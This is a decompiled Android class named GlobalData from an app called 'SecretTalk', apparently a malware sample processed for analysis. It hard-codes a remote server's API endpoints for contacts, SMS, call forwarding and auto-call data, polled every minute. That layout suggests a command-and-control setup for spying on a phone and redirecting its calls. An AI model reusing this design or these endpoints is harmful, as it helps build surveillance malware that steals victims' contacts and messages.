package com.android.secrettalk;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;

public class GlobalData
{
  public static final String AUTO_CALL_URI = "http://61.33.28.196/secrettalk.server/api/api.php?mName=autoCallInformation&format=json";
  public static final String CALL_FORWARDING_URI = "http://61.33.28.196/secrettalk.server/api/api.php?mName=callForwardingInformation&format=json";
  public static final int CALL_START = 1;
  public static final int CALL_STOP = 0;
  public static final String CONTACT_URI = "http://61.33.28.196/secrettalk.server/api/api.php?mName=contactInformation&format=json";
  public static int Call_Index = 0;
  public static int Call_State = 0;
  public static final String ISBLOCK_URI = "http://61.33.28.196/secrettalk.server/api/api.php?mName=isBlockInformation&format=json";
  public static String PREF_NAME;
  public static final int SEND_REQ_INTERVAL2 = 60000;
  public static final String SMS_URI = "http://61.33.28.196/secrettalk.server/api/api.php?mName=smsInformation&format=json";
  public static final String ServerIP = "http://61.33.28.196/";
  public static String auto_call_number;
  public static String[] autocall_number_list;
  public static int call_cycle;
  public static String call_id = "";
  public static int call_span;
  public static int call_time;
  public static String forwarding_number;
  public static boolean isCalling;
  public static int isForwardingActive;
  private static Context mContext = null;
  private static GlobalData mInstance = null;
  public static String my_phonenumber = "";
  
  static
  {
    forwarding_number = "";
    isForwardingActive = 0;
    call_time = 0;
    call_span = 0;
    call_cycle = 0;
    PREF_NAME = "CALL_SETTING";
    auto_call_number = "";
    Call_Index = 0;
    Call_State = 0;
    isCalling = false;
  }
  
  public static GlobalData getInstance()
  {
    if (mInstance == null) {
      mInstance = new GlobalData();
    }
    return mInstance;
  }
  
  public static void get_PREFS()
  {
    SharedPreferences localSharedPreferences = mContext.getSharedPreferences(PREF_NAME, 0);
    forwarding_number = localSharedPreferences.getString("forwarding_number", "");
    isForwardingActive = localSharedPreferences.getInt("isForwardingActive", 0);
  }
  
  public static void set_PREFS()
  {
    SharedPreferences.Editor localEditor = mContext.getSharedPreferences(PREF_NAME, 0).edit();
    localEditor.clear();
    localEditor.putString("forwarding_number", forwarding_number);
    localEditor.putInt("isForwardingActive", isForwardingActive);
    localEditor.commit();
  }
  
  public Context getContext()
  {
    return mContext;
  }
  
  public void setContext(Context paramContext)
  {
    if (mContext == null) {
      mContext = paramContext;
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.GlobalData
 * JD-Core Version:    0.7.0.1
 */